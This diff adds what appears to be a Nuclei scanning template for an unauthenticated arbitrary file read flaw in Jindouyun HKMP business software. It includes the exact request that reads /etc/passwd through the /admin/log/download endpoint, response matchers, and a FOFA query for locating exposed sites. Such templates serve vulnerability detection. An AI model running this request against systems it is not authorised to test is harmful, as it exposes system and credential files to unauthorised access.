@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - root:x
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /admin/log/download?file=/etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+id: jindouyun-HKMP_download-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="金斗云 Copyright"
+        金斗云 HKMP智慧商业软件 download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 金斗云 HKMP智慧商业软件 download 任意文件读取漏洞
+    reference:
+        - https://superhero.blog.csdn.net/article/details/140485949
+    severity: high
+    tags:
+        - File reading
